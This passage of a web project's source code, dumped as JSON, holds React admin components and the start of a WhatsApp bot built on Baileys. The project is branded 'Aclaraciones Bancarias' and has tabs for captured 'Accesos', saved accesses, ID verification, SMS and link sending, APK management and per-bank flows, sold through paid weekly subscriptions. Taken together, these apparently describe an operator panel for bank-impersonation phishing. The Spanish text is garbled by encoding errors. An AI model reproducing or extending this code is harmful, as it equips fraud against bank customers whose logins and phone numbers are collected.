\"flex h-11 w-full rounded-md bg-transparent py-3 text-sm outline-none placeholder:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50\",\n        className\n      )}\n      {...props}\n    />\n  </div>\n))\n\nCommandInput.displayName = CommandPrimitive.Input.displayName\n\nconst CommandList = React.forwardRef<\n  React.ElementRef<typeof CommandPrimitive.List>,\n  React.ComponentPropsWithoutRef<typeof CommandPrimitive.List>\n>(({ className, ...props }, ref) => (\n  <CommandPrimitive.List\n    ref={ref}\n    className={cn(\"max-h-[300px] overflow-y-auto overflow-x-hidden\", className)}\n    {...props}\n  />\n))\n\nCommandList.displayName = CommandPrimitive.List.displayName\n\nconst CommandEmpty = React.forwardRef<\n  React.ElementRef<typeof CommandPrimitive.Empty>,\n  React.ComponentPropsWithoutRef<typeof CommandPrimitive.Empty>\n>((props, ref) => (\n  <CommandPrimitive.Empty\n    ref={ref}\n    className=\"py-6 text-center text-sm\"\n    {...props}\n  />\n))\n\nCommandEmpty.displayName = CommandPrimitive.Empty.displayName\n\nconst CommandGroup = React.forwardRef<\n  React.ElementRef<typeof CommandPrimitive.Group>,\n  React.ComponentPropsWithoutRef<typeof CommandPrimitive.Group>\n>(({ className, ...props }, ref) => (\n  <CommandPrimitive.Group\n    ref={ref}\n    className={cn(\n      \"overflow-hidden p-1 text-foreground [&_[cmdk-group-heading]]:px-2 [&_[cmdk-group-heading]]:py-1.5 [&_[cmdk-group-heading]]:text-xs [&_[cmdk-group-heading]]:font-medium [&_[cmdk-group-heading]]:text-muted-foreground\",\n      className\n    )}\n    {...props}\n  />\n))\n\nCommandGroup.displayName = CommandPrimitive.Group.displayName\n\nconst CommandSeparator = React.forwardRef<\n  React.ElementRef<typeof CommandPrimitive.Separator>,\n  React.ComponentPropsWithoutRef<typeof CommandPrimitive.Separator>\n>(({ className, ...props }, ref) => (\n  <CommandPrimitive.Separator\n    ref={ref}\n    className={cn(\"-mx-1 h-px bg-border\", className)}\n    {...props}\n  />\n))\nCommandSeparator.displayName = CommandPrimitive.Separator.displayName\n\nconst CommandItem = React.forwardRef<\n  React.ElementRef<typeof CommandPrimitive.Item>,\n  React.ComponentPropsWithoutRef<typeof CommandPrimitive.Item>\n>(({ className, ...props }, ref) => (\n  <CommandPrimitive.Item\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none data-[disabled=true]:pointer-events-none data-[selected='true']:bg-accent data-[selected=true]:text-accent-foreground data-[disabled=true]:opacity-50\",\n      className\n    )}\n    {...props}\n  />\n))\n\nCommandItem.displayName = CommandPrimitive.Item.displayName\n\nconst CommandShortcut = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLSpanElement>) => {\n  return (\n    <span\n      className={cn(\n        \"ml-auto text-xs tracking-widest text-muted-foreground\",\n        className\n      )}\n      {...props}\n    />\n  )\n}\nCommandShortcut.displayName = \"CommandShortcut\"\n\nexport {\n  Command,\n  CommandDialog,\n  CommandInput,\n  CommandList,\n  CommandEmpty,\n  CommandGroup,\n  CommandItem,\n  CommandShortcut,\n  CommandSeparator,\n}\n","size_bytes":4879},"client/src/components/admin/SystemConfigManagement.tsx":{"content":"import { useState } from \"react\";\nimport { useQuery, useMutation, useQueryClient } from \"@tanstack/react-query\";\nimport { Button } from \"@/components/ui/button\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport { apiRequest } from \"@/lib/queryClient\";\nimport { DollarSign, Save, Info } from \"lucide-react\";\nimport { Alert, AlertDescription } from \"@/components/ui/alert\";\n\ninterface SystemConfig {\n  id?: number;\n  subscriptionPrice: string;\n  updatedAt?: string | null;\n  updatedBy?: number | null;\n}\n\nconst SystemConfigManagement = () => {\n  const { toast } = useToast();\n  const queryClient = useQueryClient();\n  \n  const [subscriptionPrice, setSubscriptionPrice] = useState(\"\");\n\n  const { data: systemConfig, isLoading } = useQuery({\n    queryKey: ['/api/system-config'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/system-config');\n      if (!res.ok) {\n        throw new Error('Error al obtener la configuraci贸n del sistema');\n      }\n      const data = await res.json();\n      setSubscriptionPrice(data.subscriptionPrice || \"0\");\n      return data as SystemConfig;\n    }\n  });\n\n  const updateConfigMutation = useMutation({\n    mutationFn: async (newPrice: string) => {\n      const res = await apiRequest('POST', '/api/system-config', {\n        subscriptionPrice: newPrice\n      });\n      if (!res.ok) {\n        const errorData = await res.json();\n        throw new Error(errorData.message || 'Error al actualizar la configuraci贸n');\n      }\n      return await res.json();\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Configuraci贸n actualizada\",\n        description: \"El precio de suscripci贸n ha sido actualizado correctamente.\",\n        variant: \"default\"\n      });\n      queryClient.invalidateQueries({ queryKey: ['/api/system-config'] });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error\",\n        description: error.message,\n        variant: \"destructive\"\n      });\n    }\n  });\n\n  const handleSubmit = (e: React.FormEvent) => {\n    e.preventDefault();\n    \n    const price = parseFloat(subscriptionPrice);\n    if (isNaN(price) || price < 0) {\n      toast({\n        title: \"Error de validaci贸n\",\n        description: \"Por favor ingresa un precio v谩lido (n煤mero mayor o igual a 0).\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    updateConfigMutation.mutate(subscriptionPrice);\n  };\n\n  return (\n    <div className=\"space-y-6\">\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <DollarSign className=\"w-5 h-5\" />\n            Configuraci贸n de Precios\n          </CardTitle>\n          <CardDescription>\n            Configura el precio de suscripci贸n que se cobrar谩 a los usuarios por 7 d铆as de acceso\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <Alert className=\"mb-6 bg-blue-50 dark:bg-blue-950 border-blue-200 dark:border-blue-800\">\n            <Info className=\"h-4 w-4 text-blue-600 dark:text-blue-400\" />\n            <AlertDescription className=\"text-blue-800 dark:text-blue-200\">\n              <strong>Sistema de Pagos Autom谩tico con Bitso:</strong>\n              <ul className=\"mt-2 ml-4 list-disc space-y-1\">\n                <li>Los usuarios depositar谩n a la cuenta Bitso configurada</li>\n                <li>El bot verificar谩 los pagos autom谩ticamente con la API de Bitso</li>\n                <li>Los usuarios ser谩n activados por 7 d铆as al confirmar el pago</li>\n                <li>Se enviar谩n recordatorios 1 d铆a antes del vencimiento</li>\n              </ul>\n            </AlertDescription>\n          </Alert>\n\n          <form onSubmit={handleSubmit} className=\"space-y-4\">\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"subscriptionPrice\">Precio de Suscripci贸n (7 d铆as)</Label>\n              <div className=\"relative\">\n                <span className=\"absolute left-3 top-1/2 -translate-y-1/2 text-gray-500\">$</span>\n                <Input\n                  id=\"subscriptionPrice\"\n                  type=\"number\"\n                  step=\"0.01\"\n                  value={subscriptionPrice}\n                  onChange={(e) => setSubscriptionPrice(e.target.value)}\n                  placeholder=\"0.00\"\n                  className=\"pl-8\"\n                  disabled={isLoading}\n                />\n              </div>\n              <p className=\"text-sm text-muted-foreground\">\n                Este es el monto que se cobrar谩 a los usuarios por una suscripci贸n de 7 d铆as\n              </p>\n            </div>\n\n            <div className=\"flex items-center gap-3\">\n              <Button \n                type=\"submit\" \n                disabled={updateConfigMutation.isPending || isLoading}\n                className=\"w-full sm:w-auto\"\n              >\n                <Save className=\"w-4 h-4 mr-2\" />\n                {updateConfigMutation.isPending ? \"Guardando...\" : \"Guardar Configuraci贸n\"}\n              </Button>\n            </div>\n          </form>\n\n          {systemConfig?.updatedAt && (\n            <div className=\"mt-6 pt-6 border-t\">\n              <p className=\"text-sm text-muted-foreground\">\n                ltima actualizaci贸n: {new Date(systemConfig.updatedAt).toLocaleString('es-MX')}\n              </p>\n            </div>\n          )}\n        </CardContent>\n      </Card>\n\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <Info className=\"w-5 h-5\" />\n            Informaci贸n de Pago\n          </CardTitle>\n          <CardDescription>\n            Detalles importantes sobre el sistema de pagos\n          </CardDescription>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          <div className=\"space-y-2\">\n            <h3 className=\"font-semibold\">Cuenta de Dep贸sito</h3>\n            <p className=\"text-sm text-muted-foreground\">\n              <strong>Plataforma:</strong> Bitso<br />\n              <strong>Seguridad:</strong> La cuenta est谩 configurada de forma segura en Replit Secrets<br />\n              <strong>Nota:</strong> El bot NO compartir谩 esta informaci贸n con los usuarios. Solo el administrador del sistema tiene acceso a estos datos.\n            </p>\n          </div>\n\n          <div className=\"space-y-2\">\n            <h3 className=\"font-semibold\">Funcionamiento del Bot</h3>\n            <ul className=\"text-sm text-muted-foreground space-y-1 list-disc list-inside\">\n              <li>Respuestas de IA simples solo relacionadas a pagos</li>\n              <li>Gu铆a a los usuarios sobre c贸mo realizar el pago</li>\n              <li>Verifica autom谩ticamente los pagos con la API de Bitso</li>\n              <li>Activa usuarios por 7 d铆as al confirmar el pago</li>\n              <li>Env铆a recordatorios de renovaci贸n 1 d铆a antes del vencimiento</li>\n            </ul>\n          </div>\n\n          <Alert>\n            <Info className=\"h-4 w-4\" />\n            <AlertDescription>\n              El precio configurado aqu铆 ser谩 el monto que el bot verificar谩 en los dep贸sitos de Bitso.\n              Aseg煤rate de mantenerlo actualizado.\n            </AlertDescription>\n          </Alert>\n        </CardContent>\n      </Card>\n    </div>\n  );\n};\n\nexport default SystemConfigManagement;\n","size_bytes":7440},"client/src/components/admin/Sidebar.tsx":{"content":"import React, { useState } from 'react';\nimport { MessageSquare, Menu, X, QrCode, Bot, Send, Package, Globe, DollarSign, Users, Smartphone, Link2, Settings } from 'lucide-react';\nimport balonxLogo from '@assets/balonx_1756163316921.jpg';\n\ninterface SidebarProps {\n  activeTab: string;\n  onTabChange: (tab: string) => void;\n  isAdmin: boolean;\n  isSuperAdmin: boolean;\n  accountType?: 'individual' | 'office';\n  isExecutive?: boolean;\n}\n\nconst Sidebar: React.FC<SidebarProps> = ({ activeTab, onTabChange, isAdmin, isSuperAdmin, accountType, isExecutive }) => {\n  const [isMenuOpen, setIsMenuOpen] = useState(false);\n\n  const toggleMenu = () => {\n    setIsMenuOpen(!isMenuOpen);\n  };\n\n  const handleTabChange = (tab: string) => {\n    onTabChange(tab);\n    // En m贸vil, cerramos el men煤 despu茅s de seleccionar una opci贸n\n    if (window.innerWidth < 768) {\n      setIsMenuOpen(false);\n    }\n  };\n\n  // Verificar si la funci贸n \"Bot WhatsApp\" es nueva (mostrar badge por 7 d铆as)\n  const isWhatsAppFeatureNew = () => {\n    const featureReleaseDate = new Date('2025-10-04'); // Fecha de lanzamiento\n    const currentDate = new Date();\n    const daysDifference = Math.floor((currentDate.getTime() - featureReleaseDate.getTime()) / (1000 * 60 * 60 * 24));\n    return daysDifference <= 7;\n  };\n\n  return (\n    <>\n      {/* Bot贸n de hamburguesa m贸vil */}\n      <button \n        className=\"md:hidden fixed top-4 left-4 z-50 bg-[#1f1f1f] p-2 rounded-full shadow-lg\"\n        onClick={toggleMenu}\n      >\n        {isMenuOpen ? (\n          <X className=\"h-6 w-6 text-white\" />\n        ) : (\n          <Menu className=\"h-6 w-6 text-white\" />\n        )}\n      </button>\n\n      {/* Sidebar - adaptable para m贸vil/desktop */}\n      <div \n        className={`\n          ${isMenuOpen ? 'translate-x-0' : '-translate-x-full md:translate-x-0'} \n          fixed md:static top-0 left-0 z-40\n          w-72 md:w-60 bg-[#1f1f1f] p-5 h-screen flex flex-col\n          transition-transform duration-300 ease-in-out\n        `}\n      >\n        <div className=\"text-center mb-5 mt-4 md:mt-0\">\n          <div className=\"mb-2\">\n            <img src={balonxLogo} alt=\"Balonx Logo\" className=\"w-10 h-10 mx-auto\" />\n          </div>\n          <h3 className=\"text-gray-300 text-sm\">Aclaraciones Bancarias</h3>\n          <p className=\"text-gray-500 text-xs\">{isAdmin ? \"Admin\" : \"Usuario\"}</p>\n        </div>\n        <div className=\"nav flex-1 space-y-2\">\n          <button \n            onClick={() => handleTabChange('current')}\n            className={`block w-full text-left ${activeTab === 'current' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all`}\n          >\n            Accesos\n          </button>\n          \n          <button \n            onClick={() => handleTabChange('saved')}\n            className={`block w-full text-left ${activeTab === 'saved' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all`}\n          >\n            Accesos Guardados\n          </button>\n          \n          {/* Gesti贸n de ejecutivos para cuentas de oficina (solo due帽o, no ejecutivos) */}\n          {accountType === 'office' && !isExecutive && (\n            <button \n              onClick={() => handleTabChange('executives')}\n              className={`block w-full text-left ${activeTab === 'executives' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n            >\n              <Users className=\"mr-2 h-4 w-4\" />\n              Ejecutivos\n            </button>\n          )}\n          \n          {/* Verificaci贸n ID para todos los usuarios */}\n          <button \n            onClick={() => handleTabChange('identity')}\n            className={`block w-full text-left ${activeTab === 'identity' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n          >\n            <svg className=\"mr-2 h-4 w-4\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\">\n              <path strokeLinecap=\"round\" strokeLinejoin=\"round\" strokeWidth={2} d=\"M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z\" />\n            </svg>\n            Verificaci贸n ID\n          </button>\n          \n          {isSuperAdmin && (\n            <>\n              <button \n                onClick={() => handleTabChange('registered')}\n                className={`block w-full text-left ${activeTab === 'registered' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all`}\n              >\n                Usuarios\n              </button>\n              \n              <button \n                onClick={() => handleTabChange('users')}\n                className={`block w-full text-left ${activeTab === 'users' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all`}\n              >\n                Usuarios Nuevos\n              </button>\n            </>\n          )}\n          \n          {/* SMS para todos los usuarios */}\n          <button \n            onClick={() => handleTabChange('sms')}\n            className={`block w-full text-left ${activeTab === 'sms' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n          >\n            <MessageSquare className=\"mr-2 h-4 w-4\" />\n            {isAdmin ? 'API MSJ' : 'Enviar SMS'}\n          </button>\n          \n          {/* Bot WhatsApp para todos los usuarios */}\n          <button \n            onClick={() => handleTabChange('whatsapp')}\n            className={`block w-full text-left ${activeTab === 'whatsapp' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center relative`}\n          >\n            <Smartphone className=\"mr-2 h-4 w-4\" />\n            Bot WhatsApp\n            {isWhatsAppFeatureNew() && (\n              <span className=\"ml-auto flex items-center\">\n                <span \n                  className=\"bg-gradient-to-r from-green-400 to-emerald-500 text-white text-[10px] font-bold px-2 py-0.5 rounded-full shadow-lg animate-pulse\"\n                  style={{\n                    animation: 'pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite'\n                  }}\n                >\n                  NUEVO\n                </span>\n                <span className=\"absolute right-3 top-1/2 -translate-y-1/2\">\n                  <span className=\"flex h-3 w-3\">\n                    <span className=\"animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75\"></span>\n                    <span className=\"relative inline-flex rounded-full h-3 w-3 bg-green-500\"></span>\n                  </span>\n                </span>\n              </span>\n            )}\n          </button>\n\n          {/* Links para todos los usuarios */}\n          <button \n            onClick={() => handleTabChange('links')}\n            className={`block w-full text-left ${activeTab === 'links' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n          >\n            <Link2 className=\"mr-2 h-4 w-4\" />\n            Links\n          </button>\n          \n          {isAdmin && (\n            <>\n              <button \n                onClick={() => handleTabChange('qr')}\n                className={`block w-full text-left ${activeTab === 'qr' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n              >\n                <QrCode className=\"mr-2 h-4 w-4\" />\n                Generador QR\n              </button>\n              \n              <button \n                onClick={() => handleTabChange('telegram')}\n                className={`block w-full text-left ${activeTab === 'telegram' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n              >\n                <Bot className=\"mr-2 h-4 w-4\" />\n                Bot Telegram\n              </button>\n              \n              <button \n                onClick={() => handleTabChange('messages')}\n                className={`block w-full text-left ${activeTab === 'messages' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n              >\n                <Send className=\"mr-2 h-4 w-4\" />\n                Mensajes\n              </button>\n              \n              <button \n                onClick={() => handleTabChange('apk')}\n                className={`block w-full text-left ${activeTab === 'apk' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n              >\n                <Package className=\"mr-2 h-4 w-4\" />\n                APK Management\n              </button>\n              \n              <button \n                onClick={() => handleTabChange('system-config')}\n                className={`block w-full text-left ${activeTab === 'system-config' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n                data-testid=\"button-system-config\"\n              >\n                <DollarSign className=\"mr-2 h-4 w-4\" />\n                Configuraci贸n de Precios\n              </button>\n              \n              <button \n                onClick={() => handleTabChange('site-config')}\n                className={`block w-full text-left ${activeTab === 'site-config' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n                data-testid=\"button-site-config\"\n              >\n                <Globe className=\"mr-2 h-4 w-4\" />\n                Configuraci贸n del Sitio\n              </button>\n              \n              <button \n                onClick={() => handleTabChange('bank-flows')}\n                className={`block w-full text-left ${activeTab === 'bank-flows' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n                data-testid=\"button-bank-flows\"\n              >\n                <Settings className=\"mr-2 h-4 w-4\" />\n                Flujos por Banco\n              </button>\n              \n              <button \n                onClick={() => handleTabChange('flows')}\n                className={`block w-full text-left ${activeTab === 'flows' ? 'bg-[#007bff]' : 'bg-gray-700'} text-white py-2 px-3 rounded hover:bg-opacity-90 transition-all flex items-center`}\n                data-testid=\"button-flows\"\n              >\n                <Settings className=\"mr-2 h-4 w-4\" />\n                Mis Flujos Personalizados\n              </button>\n            </>\n          )}\n        </div>\n      </div>\n      \n      {/* Superposici贸n oscura cuando el men煤 est谩 abierto en m贸vil */}\n      {isMenuOpen && (\n        <div \n          className=\"md:hidden fixed inset-0 bg-black bg-opacity-50 z-30\"\n          onClick={() => setIsMenuOpen(false)}\n        />\n      )}\n    </>\n  );\n};\n\nexport default Sidebar;\n","size_bytes":11247},"server/whatsapp-bot.ts":{"content":"import makeWASocket, { \n  useMultiFileAuthState, \n  DisconnectReason,\n  WASocket,\n  proto,\n  WAMessage,\n  generateWAMessageFromContent,\n  prepareWAMessageMedia\n} from '@whiskeysockets/baileys';\nimport { Boom } from '@hapi/boom';\nimport P from 'pino';\nimport QRCode from 'qrcode';\nimport fs from 'fs';\nimport path from 'path';\nimport { IStorage } from './storage';\n\ninterface WhatsAppBotConfig {\n  userId: number;\n  storage: IStorage;\n  onQRUpdate?: (qr: string) => void;\n  onConnected?: () => void;\n  onDisconnected?: () => void;\n}\n\nexport class WhatsAppBot {\n  private sock: WASocket | null = null;\n  private config: WhatsAppBotConfig;\n  private authFolder: string;\n  private menuState: Map<string, { waitingForInput: boolean; lastMessageTime: number; currentMenuId: number | null }> = new Map();\n  private phoneToSessionMap: Map<string, string> = new Map(); // Mapea n煤mero de tel茅fono a sessionId\n  private shouldReconnect: boolean = true; // Flag para controlar la reconexi贸n autom谩tica\n  private qrTimeout: NodeJS.Timeout | null = null; // Timeout para regenerar QR si expira\n\n  constructor(config: WhatsAppBotConfig) {\n    this.config = config;\n    this.authFolder = path.join(process.cwd(), 'whatsapp_sessions', `user_${config.userId}`);\n    \n    // Crear carpeta de sesiones si no existe\n    if (!fs.existsSync(path.join(process.cwd(), 'whatsapp_sessions'))) {\n      fs.mkdirSync(path.join(process.cwd(), 'whatsapp_sessions'));\n    }\n  }\n\n  async start() {\n    try {\n      console.log(`[WhatsApp Bot] Iniciando bot para usuario ${this.config.userId}`);\n      \n      // Restaurar flag de reconexi贸n autom谩tica\n      this.shouldReconnect = true;\n      \n      const { state, saveCreds } = await useMultiFileAuthState(this.authFolder);\n      \n      this.sock = makeWASocket({\n        auth: state,\n        logger: P({ level: 'silent' }),\n        printQRInTerminal: true, // Enable for debugging\n        browser: ['WhatsApp Bot', 'Chrome', '1.0.0'],\n        connectTimeoutMs: 60000, // Increase timeout to 60 seconds\n        defaultQueryTimeoutMs: undefined,\n        keepAliveIntervalMs: 30000\n      });\n\n      // Guardar credenciales cuando se actualicen\n      this.sock.ev.on('creds.update', saveCreds);\n\n      // Manejar actualizaciones de conexi贸n\n      this.sock.ev.on('connection.update', async (update) => {\n        const { connection, lastDisconnect, qr } = update;\n        \n        if (qr) {\n          // Limpiar timeout previo\n          if (this.qrTimeout) {\n            clearTimeout(this.qrTimeout);\n          }\n          \n          console.log(`[WhatsApp Bot]  QR generado para usuario ${this.config.userId}`);\n          const qrDataUrl = await QRCode.toDataURL(qr);\n          \n          // Actualizar QR en la base de datos\n          await this.updateQRCode(qrDataUrl);\n          \n          if (this.config.onQRUpdate) {\n            this.config.onQRUpdate(qrDataUrl);\n          }\n          \n          // Establecer timeout para regenerar QR si no se escanea en 60 segundos\n          this.qrTimeout = setTimeout(() => {\n            console.log(`[WhatsApp Bot]  QR expirado, cerrando conexi贸n para regenerar...`);\n            this.sock?.ws?.close();\n          }, 60000);\n        }\n        \n        if (connection === 'close') {\n          const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;\n          const isLoggedOut = statusCode === DisconnectReason.loggedOut;\n          \n          console.log(`[WhatsApp Bot] Conexi贸n cerrada para usuario ${this.config.userId}, c贸digo: ${statusCode}, deslogueado: ${isLoggedOut}`);\n          \n          // Solo limpiar sesi贸n si fue un logout real\n          if (isLoggedOut) {\n            console.log(`[WhatsApp Bot] Logout detectado, limpiando sesi贸n...`);\n            await this.clearSession();\n          }\n          \n          // Actualizar estado de conexi贸n\n          await this.updateConnectionStatus(false);\n          \n          // Notificar desconexi贸n\n          if (this.config.onDisconnected) {\n            this.config.onDisconnected();\n          }\n          \n          // Solo reiniciar si shouldReconnect es true (no fue detenido manualmente)\n          if (this.shouldReconnect && !isLoggedOut) {\n            console.log(`[WhatsApp Bot] Reconectando autom谩ticamente...`);\n            setTimeout(() => {\n              this.start();\n            }, 2000); // Esperar 2 segundos antes de reiniciar\n          } else if (isLoggedOut) {\n            console.log(`[WhatsApp Bot] Sesi贸n cerrada, necesita nuevo QR`);\n            // Reiniciar para generar nuevo QR\n            if (this.shouldReconnect) {\n              setTimeout(() => {\n                this.start();\n              }, 2000);\n            }\n          } else {\n            console.log(`[WhatsApp Bot] Bot detenido manualmente, no se reconectar谩`);\n          }\n        } else if (connection === 'open') {\n          // Limpiar timeout de QR\n          if (this.qrTimeout) {\n            clearTimeout(this.qrTimeout);\n            this.qrTimeout = null;\n          }\n          \n          console.log(`[WhatsApp Bot]  Conectado exitosamente para usuario ${this.config.userId}`);\n          \n          const phoneNumber = this.sock?.user?.id?.split(':')[0] || '';\n          await this.updateConnectionStatus(true, phoneNumber);\n          \n          if (this.config.onConnected) {\n            this.config.onConnected();\n          }\n        }\n      });\n\n      // Manejar mensajes entrantes\n      this.sock.ev.on('messages.upsert', async ({ messages, type }) => {\n        if (type !== 'notify') return;\n        \n        for (const msg of messages) {\n          await this.handleIncomingMessage(msg);\n        }\n      });\n\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error al iniciar bot para usuario ${this.config.userId}:`, error);\n      throw error;\n    }\n  }\n\n  async stop() {\n    try {\n      console.log(`[WhatsApp Bot] Deteniendo bot para usuario ${this.config.userId}`);\n      \n      // Limpiar timeout de QR si existe\n      if (this.qrTimeout) {\n        clearTimeout(this.qrTimeout);\n        this.qrTimeout = null;\n      }\n      \n      // Establecer flag para evitar reconexi贸n autom谩tica\n      this.shouldReconnect = false;\n      \n      if (this.sock) {\n        try {\n          // Intentar hacer logout solo si la conexi贸n est谩 activa\n          await this.sock.logout();\n          console.log(`[WhatsApp Bot] Logout exitoso`);\n        } catch (logoutError: any) {\n          // Si falla el logout (ej: conexi贸n ya cerrada), solo registrar el error\n          console.log(`[WhatsApp Bot] No se pudo hacer logout (conexi贸n ya cerrada): ${logoutError.message}`);\n        }\n        \n        this.sock = null;\n      }\n      \n      // Limpiar sesi贸n y actualizar estado\n      await this.clearSession();\n      await this.updateConnectionStatus(false);\n      \n      console.log(`[WhatsApp Bot] Bot detenido correctamente`);\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error al detener bot:`, error);\n      throw error;\n    }\n  }\n\n  private async clearSession() {\n    try {\n      console.log(`[WhatsApp Bot] Limpiando sesi贸n para usuario ${this.config.userId}`);\n      \n      // Eliminar la carpeta de autenticaci贸n si existe\n      if (fs.existsSync(this.authFolder)) {\n        fs.rmSync(this.authFolder, { recursive: true, force: true });\n        console.log(`[WhatsApp Bot] Sesi贸n limpiada para usuario ${this.config.userId}`);\n      }\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error al limpiar sesi贸n:`, error);\n    }\n  }\n\n  async sendMessage(phoneNumber: string, message: string) {\n    if (!this.sock) {\n      throw new Error('Bot no est谩 conectado');\n    }\n\n    console.log(`[WhatsApp Bot]  N煤mero recibido: \"${phoneNumber}\"`);\n\n    // Formatear n煤mero para WhatsApp\n    let jid: string;\n    let formattedNumber: string;\n    \n    if (phoneNumber.includes('@')) {\n      jid = phoneNumber;\n      formattedNumber = phoneNumber.split('@')[0];\n    } else {\n      // Limpiar el n煤mero (eliminar espacios, guiones, par茅ntesis, +)\n      let cleanNumber = phoneNumber.replace(/[\\s\\-\\(\\)\\+]/g, '');\n      console.log(`[WhatsApp Bot]  N煤mero limpio: \"${cleanNumber}\" (${cleanNumber.length} d铆gitos)`);\n      \n      // Para n煤meros de M茅xico (10 d铆gitos), agregar 521 (c贸digo de pa铆s + 1 para celular)\n      if (cleanNumber.length === 10) {\n        cleanNumber = '521' + cleanNumber;\n        console.log(`[WhatsApp Bot]  Formato M茅xico celular: \"${cleanNumber}\"`);\n      }\n      // Si ya tiene 521 al inicio (13 d铆gitos), dejarlo como est谩\n      else if (cleanNumber.length === 13 && cleanNumber.startsWith('521')) {\n        console.log(`[WhatsApp Bot]  N煤mero ya tiene formato correcto: \"${cleanNumber}\"`);\n      }\n      // Si tiene 52 al inicio pero no 521 (12 d铆gitos), agregar el 1\n      else if (cleanNumber.length === 12 && cleanNumber.startsWith('52') && !cleanNumber.startsWith('521')) {\n        cleanNumber = '521' + cleanNumber.substring(2);\n        console.log(`[WhatsApp Bot]  Corrigiendo a formato celular: \"${cleanNumber}\"`);\n      }\n      \n      formattedNumber = cleanNumber;\n      jid = `${cleanNumber}@s.whatsapp.net`;\n    }\n    \n    console.log(`[WhatsApp Bot]  JID final: \"${jid}\"`);\n    await this.sock.sendMessage(jid, { text: message });\n    console.log(`[WhatsApp Bot]  Mensaje enviado exitosamente`);\n    \n    // Guardar en historial con n煤mero formateado (siempre con 521)\n    await this.saveConversation(formattedNumber, message, true);\n  }\n\n  private async handleIncomingMessage(msg: WAMessage) {\n    try {\n      // Ignorar mensajes propios\n      if (msg.key.fromMe) return;\n      \n      // Ignorar mensajes sin contenido\n      if (!msg.message) return;\n\n      const sender = msg.key.remoteJid || '';\n      const phoneNumber = sender.split('@')[0];\n      \n      // Obtener texto del mensaje (puede venir de varios lugares)\n      let text = msg.message.conversation || \n                 msg.message.extendedTextMessage?.text || \n                 msg.message.buttonsResponseMessage?.selectedButtonId ||\n                 msg.message.listResponseMessage?.singleSelectReply?.selectedRowId ||\n                 '';\n      \n      console.log(`[WhatsApp Bot] Mensaje recibido de ${phoneNumber}: ${text}`);\n\n      // Guardar mensaje en historial\n      await this.saveConversation(phoneNumber, text, false);\n\n      // Actualizar el n煤mero de celular en la sesi贸n asociada\n      // Primero intentar usar la asociaci贸n en memoria (si existe)\n      let sessionId: string | null | undefined = this.phoneToSessionMap.get(phoneNumber);\n      \n      // Si no hay asociaci贸n en memoria, buscar la sesi贸n m谩s reciente activa del usuario\n      if (!sessionId) {\n        sessionId = await this.getLatestSessionId();\n      }\n      \n      if (sessionId) {\n        try {\n          await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);\n          // Actualizar el Map para futuras referencias\n          this.phoneToSessionMap.set(phoneNumber, sessionId);\n          console.log(`[WhatsApp Bot]  N煤mero ${phoneNumber} guardado en sesi贸n ${sessionId}`);\n        } catch (error) {\n          console.error(`[WhatsApp Bot]  Error guardando n煤mero en sesi贸n:`, error);\n        }\n      } else {\n        console.log(`[WhatsApp Bot] 癸 No hay sesi贸n activa para asociar el n煤mero ${phoneNumber}`);\n      }\n\n      // Verificar si el 